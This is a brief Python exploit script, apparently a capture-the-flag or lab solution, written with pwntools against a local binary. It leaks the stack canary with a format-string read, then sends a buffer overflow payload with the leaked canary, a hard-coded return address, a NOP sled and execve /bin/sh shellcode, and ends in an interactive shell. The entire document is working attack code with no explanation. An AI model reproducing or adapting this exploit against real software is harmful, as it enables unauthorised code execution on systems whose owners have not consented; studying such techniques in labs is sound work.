#!/usr/bin/env python
import pwn
# import re

# pwn.context.log_level = 'critical'

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"  # /bin/sh

elf = pwn.ELF('./program')
rip = 0x7fffffffe580 + 35

canary_cookie_offset = 27

p = elf.process()
p.recvline()
p.sendline('%{}$lx'.format(canary_cookie_offset))
leak = p.recvline().strip()
canary_cookie_value = int(leak.split(' ')[1][:-1], 16)

pwn.log.info('Canary Cookie value: {}'.format(hex(canary_cookie_value)))

payload = ''
payload += 'A' * 168
payload += pwn.p64(canary_cookie_value)
payload += "JUNKJUNK"
payload += pwn.p64(rip)
payload += "\x90" * 100
payload += shellcode

open('payload.txt', 'w').write('{}\n{}'.format(
    '%{}$lx'.format(canary_cookie_offset),
    payload
))

p.sendline(payload)
p.interactive()
